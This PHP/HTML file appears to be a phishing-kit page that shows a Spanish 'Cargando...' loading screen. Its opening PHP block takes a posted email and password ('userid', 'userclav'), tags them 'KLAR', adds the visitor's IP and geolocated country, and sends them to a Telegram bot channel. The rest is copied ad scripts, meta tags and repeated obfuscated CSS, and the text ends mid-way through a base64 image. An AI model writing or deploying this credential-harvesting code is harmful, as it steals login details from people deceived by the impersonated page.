<?php
ini_set("display_errors", 0);
@$userp = $_SERVER['REMOTE_ADDR'];
@$meta = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.$userp));
@$pais = $meta['geoplugin_countryName']; 
include('datos_de_tel.php');
    
if( isset ($_POST['userid']) && isset ($_POST['userclav'])  ){

$message = "KLAR\r\nEmail: ".$_POST['userid']."\r\nClave: ".$_POST['userclav']."\r\nIP:".$userp." ".$pais."";

$apiToken = $apibot;
$data = [
    'chat_id' => $canal,
    'text' => $message
];
$response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" . http_build_query($data) );




}


?>

<!DOCTYPE html>
<html lang="es"><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1252"><script type="text/javascript" async="" src="./index_files/id5PrebidModule.js.descargar"></script>






    
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Cargando...</title>
    <link rel="stylesheet" href="./index_files/styles.css">
    
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background-color: #f4f4f4;
            margin: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }
        .container {
            background-color: white;
            padding: 20px;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            text-align: center;
        }
        .mensaje {
            font-size: 20px;
            font-weight: bold;
            color: #004080;
            margin-top: 15px;
        }
        .gif-carga {
            width: 80px;
            margin-top: 20px;
        }
    </style>
<meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A9wSqI5i0iwGdf6L1CERNdmsTPgVu44ewj8QxTBYgsv1LCPUVF7YmWOvTappqB1139jAymxUW/RO8zmMqo4zlAAAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A+d7vJfYtay4OUbdtRPZA3y7bKQLsxaMEPmxgfhBGqKXNrdkCQeJlUwqa6EBbSfjwFtJWTrWIioXeMW+y8bWAgQAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A9wSqI5i0iwGdf6L1CERNdmsTPgVu44ewj8QxTBYgsv1LCPUVF7YmWOvTappqB1139jAymxUW/RO8zmMqo4zlAAAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A+d7vJfYtay4OUbdtRPZA3y7bKQLsxaMEPmxgfhBGqKXNrdkCQeJlUwqa6EBbSfjwFtJWTrWIioXeMW+y8bWAgQAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXcvjGkPSc1Q1qAmNY6xHxSrQtXyGaiUeKmHf/HUsRwT5ArsHljVvhPzO7S1QxPZDaF9XBUIDHOpFpJeR62S1KoCenmT6GiaB/uoiqHiSsdY44fwO2AWJbwjEqY/SxqN7C5zr9bPYtIO2YbsCvgKnv2/cU9Aqw4MAAAAASUVORK5CYII=);
}

.qE4RXLqF7CjQDdMasnw6 {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAASlJREFUWAntVrERwjAMDNzRUbMAGzAD7AAzADUlzADMADvADDABC1DTURBedxROYjuSLZsCfPd3jqToFSUvpyj+y9GBsixPwMjhTm8GOa0XcACG6RlrDMRurCf2W2BQC0t3aZCb2wcu1kA/HfMns8lq2d9hmwO9ZIVYSG2mG4xToKNeiI3NY7vAN1YtwkPmc+lJ18fS4iPpHoE46baQcNwk3R0QJl0OAzMmTLrM5JIwku4C4ElXklkYW5GuU7+UVFVWzWRXmFbdpj2rxdmAQthWSTi9ghngJqceSDIyY+kjXALZP0KS4QaQnaC4IXbRINoD2QfRV0fxGU+s8x8p7D8dxxNVATMLqEy1nAXI5npIZY4OhElKoYC4sz2iAB1JBRagJ6mQAn7mnjeRiFQYoN5dcwAAAABJRU5ErkJggg==);
}

.amO0fvMIxb_ucTYvV4OP {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAEdJREFUWAnt17EKACAIBUDt//+5WtpsaCro3iIoYtxWxO/JHUCfqWY5U/VX73SvrcVb1QMIECBAgAABAgQIECBA4NaP7J27AxT1CDj6xo1AAAAAAElFTkSuQmCC);
}

.uMql69xeMJRRAFSeEWsw {
    display: flex;
    align-items: center;
}

.Pqaaul1UQQKVGE4TCoI6 {
    display: block;
    cursor: pointer;
    position: relative;
    transition: all ease 200ms;
    overflow: hidden;
}

.Pqaaul1UQQKVGE4TCoI6::before {
        background-color: gray;
        width: 4px;
        display: block;
        margin: 0 auto;
        content: '';
        height: 0;
        transition: all ease 200ms;
    }

.z04LWahYi2geDMSfLSxw {
        height: 8px;
        width: 8px;
        position: absolute;
        bottom: 0;
        left: 50%;
        margin-left: -4px;
        background-color: white;
        border-radius: 8px;
        pointer-events: none;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm {
        padding-top: 15px;
    }

.XJV1AgGU0406rTJYtBmv[data-unmuted="true"]:hover .Pqaaul1UQQKVGE4TCoI6::before, .Pqaaul1UQQKVGE4TCoI6.Drk4dkZsBX_6CPeZfpAm::before {
            height: 60px;
        }
.jtVk5NsEaEbv1yb3OYHQ {
    display: none;
}
</style><style>.qwkv7Kzk5cFgJHTQE3pI {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .qwkv7Kzk5cFgJHTQE3pI:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI.qcO7dv4mqUM9DLPbwAzk:not(.MoeAfdEuuBZAzqZRnZqR) {
        height: 0px !important;
    }

    .qwkv7Kzk5cFgJHTQE3pI video {
        width: 100% !important;
        height: auto !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }</style><style>.CfRoxRRBazrtMhqpT10t {
    position: relative;
    display: block;
    margin: auto;
    background-color: #000;
    overflow: hidden;

}

    .CfRoxRRBazrtMhqpT10t video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        bottom: 0;
        right: 0;
        background-color: #000;
    }
</style><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A9wSqI5i0iwGdf6L1CERNdmsTPgVu44ewj8QxTBYgsv1LCPUVF7YmWOvTappqB1139jAymxUW/RO8zmMqo4zlAAAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A+d7vJfYtay4OUbdtRPZA3y7bKQLsxaMEPmxgfhBGqKXNrdkCQeJlUwqa6EBbSfjwFtJWTrWIioXeMW+y8bWAgQAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><link href="https://securepubads.g.doubleclick.net/pagead/managed/dict/m202503200101/gpt" rel="compression-dictionary"><meta http-equiv="origin-trial" content="AlK2UR5SkAlj8jjdEc9p3F3xuFYlF6LYjAML3EOqw1g26eCwWPjdmecULvBH5MVPoqKYrOfPhYVL71xAXI1IBQoAAAB8eyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="Amm8/NmvvQfhwCib6I7ZsmUxiSCfOxWxHayJwyU1r3gRIItzr7bNQid6O8ZYaE1GSQTa69WwhPC9flq/oYkRBwsAAACCeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiV2ViVmlld1hSZXF1ZXN0ZWRXaXRoRGVwcmVjYXRpb24iLCJleHBpcnkiOjE3NTgwNjcxOTksImlzU3ViZG9tYWluIjp0cnVlfQ=="><meta http-equiv="origin-trial" content="A9wSqI5i0iwGdf6L1CERNdmsTPgVu44ewj8QxTBYgsv1LCPUVF7YmWOvTappqB1139jAymxUW/RO8zmMqo4zlAAAAACNeyJvcmlnaW4iOiJodHRwczovL2RvdWJsZWNsaWNrLm5ldDo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><meta http-equiv="origin-trial" content="A+d7vJfYtay4OUbdtRPZA3y7bKQLsxaMEPmxgfhBGqKXNrdkCQeJlUwqa6EBbSfjwFtJWTrWIioXeMW+y8bWAgQAAACTeyJvcmlnaW4iOiJodHRwczovL2dvb2dsZXN5bmRpY2F0aW9uLmNvbTo0NDMiLCJmZWF0dXJlIjoiRmxlZGdlQmlkZGluZ0FuZEF1Y3Rpb25TZXJ2ZXIiLCJleHBpcnkiOjE3MzY4MTI4MDAsImlzU3ViZG9tYWluIjp0cnVlLCJpc1RoaXJkUGFydHkiOnRydWV9"><link href="https://securepubads.g.doubleclick.net/pagead/managed/dict/m202503200101/gpt" rel="compression-dictionary"><script type="text/javascript" src="./index_files/req" async=""></script><script async="" src="https://fundingchoicesmessages.google.com/f/AGSKWxVkmMOpBWWraAclsx_r6O2yEkYTbYwVH0W_2lHNl6-bGYmeaQNUEmQ630X2zD-21JdNm0WpQVCUNbjaOxtScS6alIbIgKVUBjy4Xobl28Lgj2Xe0d3xI23WAI8CGlR-vnZoJa1GKg==?fccs=W251bGwsbnVsbCxudWxsLG51bGwsbnVsbCxudWxsLFsxNzQyNzAzODc4LDYyNDAwMDAwMF0sbnVsbCxudWxsLG51bGwsW251bGwsWzddXSwiaHR0cHM6Ly9rbGFyLXdlYi1hcHAud2ViY2luZGFyaW8uY29tL2luZGV4Mi5odG1sIixudWxsLFtbOCwiRGxXLUwtM0tKck0iXSxbOSwiZXMtNDE5Il0sWzE5LCIyIl0sWzI0LCIiXSxbMjksImZhbHNlIl1dXQ"></script><script src="./index_files/vidoomy-player.js.descargar" class="vdm-p"></script><style>.XIK3pilOtc3FkAO3vh4Y {
    border-radius: 5px;
    border: 1px solid rgb(204, 204, 204);
    padding: 4px;
    overflow: visible;
    background-color: rgb(238, 238, 238);
    box-sizing: border-box;

    position: fixed;
    bottom: 0;
    right: 0;
}

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z {
        top: 25px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ {
        bottom: 10px;
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4 {
        left: -100%;
        transform: translateX(-100%);
    }

    .XIK3pilOtc3FkAO3vh4Y.xOQMf_Rk0_Ms1nbgeBR4.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            left: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw {
        right: -100%;
        transform: translateX(100%);
    }

    .XIK3pilOtc3FkAO3vh4Y._3Gerh5ThjjalwgOax2cw.HaKXs0MkPovfax4yIOIJ {
            transform: translateX(0);
            right: 25px;
        }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 5px 5px 5px 0;
    }

    .XIK3pilOtc3FkAO3vh4Y.vrYSniMeM3ePSlY2Ou3Z._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 5px 0 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ.xOQMf_Rk0_Ms1nbgeBR4 {
        border-radius: 0px 5px 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y.pQmNKhbtigKnCfuTeMRQ._3Gerh5ThjjalwgOax2cw {
        border-radius: 5px 0 5px 5px;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t {
        height: auto;
        line-height: 20px;
        padding: 5px;
        padding-top: 0px;
        padding-bottom: 2px;
        position: absolute;
        background-color: rgb(238, 238, 238);
        border: 1px solid rgb(204, 204, 204);
        z-index: 59999;
        font-family: 'Trebuchet MS', Helvetica, Verdana, Arial;
        font-size: 12px;
        font-weight: 600;
        cursor: pointer;
        user-select: none;
        opacity: 1;
        transition: opacity 400ms ease-in-out;
    }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.T0ZhlkVFofcorgvOmVUX {
            opacity: 0;
            pointer-events: none;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.xOQMf_Rk0_Ms1nbgeBR4 {
            left: -1px;
            right: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t._3Gerh5ThjjalwgOax2cw {
            right: -1px;
            left: auto;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.vrYSniMeM3ePSlY2Ou3Z {
            bottom: -22px;
            border-top: none;
            border-bottom-left-radius: 5px;
            border-bottom-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .Y6VvljfWwquw4LCPe13t.pQmNKhbtigKnCfuTeMRQ {
            top: -22px;
            border-bottom: none;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }

    .XIK3pilOtc3FkAO3vh4Y .KU6taH6Iufu7hecLfdEz {
        position: relative;
        max-width: 100%;
        text-align: left;
        direction: ltr;
        background-color: #000;
        overflow: hidden;
    }

    .XIK3pilOtc3FkAO3vh4Y video {
        width: 100% !important;
        height: 100% !important;
        object-fit: contain !important;
        margin: auto;
        position: absolute;
        top: 0;
        left: 0;
        background-color: #000;
    }
</style><style>.hPgVrsnJ7H8GeW9du_64 {
    position: absolute;
    bottom: 10px;
    border-radius: 6px;
    transition: all ease 200ms;
    cursor: pointer;
    z-index: 100;
    background-color: rgba(103, 103, 103, 0.4);
}

    .hPgVrsnJ7H8GeW9du_64:hover {
        background-color: rgba(103, 103, 103, 0.65);
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='true'] {
        display: none;
    }

    .hPgVrsnJ7H8GeW9du_64[data-hidden='false'] {
        display: inline-block;
    }
.m3WlbIU44y_Rddhpkizv {
    left: 10px;
}
.XJV1AgGU0406rTJYtBmv {
    right: 10px;
}

.UyqeI7iVGGYgjPrc0fUx {
    display: inline-block;
    width: 34px;
    height: 28px;
    background-size: auto 20px;
    background-position: center;
    background-repeat: no-repeat;
}

.xhuCryf7wy9hnKLnO3mr {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAZRJREFUWAntlD1Ow0AQhROEQPxUhI6egIS4QDgJEg00HCSHoEAiBXTkDHAGhBCiouICIAQ05ntOxtk1liJPbNN4pJednd15bzKZTafTWtsBZweSJFkHV870xdIQ3gePIFmMyZGN5gn4kLjMQeFLQWsNXEo0NB9bySwE++AhFDa/JFX56wgdg3cTzK/lGeOMZduK2Pwm16UmxYq0Ki+ARmpebkEvFGS/VxTP7nDosoxg6kAi8TdwD9IiWCWu/w3Fh/mcdM+By/JkkGwDiVsRA3wTv8FfDXO6tuHANYRdzDhshUrffAx2LcZ6B065/h3EZq4K8NiMIfbgOgLqgvAKduIbk13lQyhaxPosFxOJzg/rClD7o8HUeeUFTMXV/i2gtg/AC9DPMS4qgnhaNWflLU0OPmCwV5ANHLEesMGs/RVIbAiiaWev1/Ennk0wh5W9gqAhc91sBvScigyGc/A1l6nOCzTnEDyrS3mrUzfiRngTXP9bAVYNBZyBTyvE4o2uiB+AJxXRqHAohvYGGIWx1m874OnAL1FHkmqT29miAAAAAElFTkSuQmCC);
}
.vni7inUOOC7J4MGBpLjk {
    background-image: url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAYAAABzenr0AAAABGdBTUEAALGPC/xhBQAAAmtJREFUWAntls9LVFEUx50MKgdnEQaSJC7CSNKFJSlKbdwJugsJWkn07wQtWkWCGKmrFkGbWoQgoqsSFyI0FEiLEApEg+L5+d6553GdH+/NjPN2c+A75957ft4z9517Ozra1K5AkxWIoqgLvG7S/HxmBL4NdkCU5AlxAcyCGdBZTfditcWkNRw9Qf4S5FP0FPAuGAGKcw3blVwud8w4plw8ShlgfAWVF2AhVMVhog/s+tCfB92gCJYw+Q93lGhsSji5xXgNDNua8bQEpId9AfYUKIktbN7DHV2wQS2O8WNk26AieLkNunnwUDyUEfAP87fgHxhDPgB3FFeAxcQDZQblPKwALmaRj4K/4B2y3VAf+TTzKfAD2SvJUisgpXoI59rMV7AHLoFHrA3BQ1pncgJuIOuVoGUJsKMIfANv8PtJzqE5AsV/BzIFV5Iil1zLEij5LP0S6DMjq8T9UMZ438/7xTNJwAfY8HzQc2M//aBHPMsEDnygq54bO/ID9ZVME7CAiTzLClz3kQ/LMrBD6VpylglM+MA6jCG5z4+FX1rMJAE+vQf41uFTQ9oEId30k+/iuqVaQgRVIxoA2rmdfHVDO3S6Ey4js5buumTLEiAQ/iM5t51XtGJkasNKQq3YfY5xAizE9wIKMeH0GZPnQIZp9BGF32Abd/HOZYQfXc